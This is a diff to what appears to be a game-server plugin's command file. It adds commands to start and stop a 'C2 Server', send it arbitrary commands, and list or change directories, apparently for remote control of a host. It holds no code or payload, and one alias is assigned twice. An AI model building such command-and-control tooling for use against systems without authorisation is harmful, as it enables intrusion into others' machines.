@@ -11,9 +11,24 @@ commands:
   startServer:
     description: Starts the C2 Server.
     usage: /startServer
+    aliases: [start]
   stopServer:
     description: Stops the C2 Server.
     usage: /stopServer
-  sendMsg:
+    aliases: [stop]
+  cmd:
     description: Send a command to the C2 server.
-    usage: /sendMsg
+    usage: /cmd (command here)
+    aliases: [command, c]
+  dir:
+    description: Send a directory request to the C2 server.
+    usage: /dir + directory
+    aliases: [directory, d]
+  cd:
+    description: Send a directory change request to the C2 server.
+    usage: /cd + directory
+    aliases: [changeDirectory, c]
+  C2Help:
+    description: ask for help :).
+    usage: /helpC2
+  
